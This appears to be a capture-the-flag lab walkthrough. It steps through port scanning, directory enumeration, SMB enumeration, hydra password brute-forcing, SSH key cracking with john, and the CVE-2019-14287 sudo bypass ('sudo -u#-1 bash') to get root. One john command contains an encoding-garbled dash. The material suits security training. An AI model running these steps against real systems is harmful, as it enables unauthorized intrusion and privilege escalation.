   1. use nmap to scan the open ports
      Syntax: nmap -sV [ip]
  
   2.use gobuster to enumerate hidden folders in web server
     Syntax: gobuster -u [HTTP://ip] -w [wordlist]
  
   3.use Enum4Linux to scan the whole system
     Syntax: Enum4linux -a [IP]
     Instead of grabbing user information from Enum4Linux output, we can scan smb to get information:
     Syntax: smbclient [IP]//[smb share] -U [username, if applicable]
  
   4.Use hydra to brutal-forcing the password:
     Syntax: hydra -l [username] -P [wordlist] [IP] [service]
     OR
     Syntax: hydra -l [username] -P [wordlist] [service://IP]
     login with the credentials get from previous steps.
  
   5.Use privilege escalation tool like LinEnum or Linpeas
     transport the linpeas:
     scp [linenum.sh] [user@ip]
  
   6.use linenum.sh to scan:
     ./linenum.sh | tee long.txt
     From task 6 we can find the id_rsa hash key for kay to login. Copy the file to the local machine and use john to crack the hash file.
     Syntax: ssh2john [file] > hash.txt
  
   7.Crack the hash file password:
     Syntax: john hash.txt â€” wordlist=[wordlist]

   8.ssh to the new user with cracked rsa_id
   
   9.Like many commands on Unix systems, sudo can be configured by editing a configuration file on your system. In this case that file is called /etc/sudoers. Editing this file directly is not recommended due to its importance to the OS installation, however, you can safely edit it with the command sudo visudo, which checks when you're saving to ensure that there are no misconfigurations.
   
   You want to let this user execute a program as if they were any other user, but you don't want to let them execute it as root. You might add this line to the sudoers file:

<user> ALL=(ALL:!root) NOPASSWD: ALL

This would let your user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. In other words, you can pretend to be any user, except from the admin.

 using sudo -u#0 <command> (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter CVE-2019-14287.

Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, despite being explicitly prevented from doing so. It is worth noting that this will only work if you've been granted non-root sudo permissions for the command, as in the configuration above.

ex: whoami
ans:bobbylove
    sudo -u#-1 bash
    sudo -u#-1 whoami
ans:root

10.sudo -l to see your privileges.
 
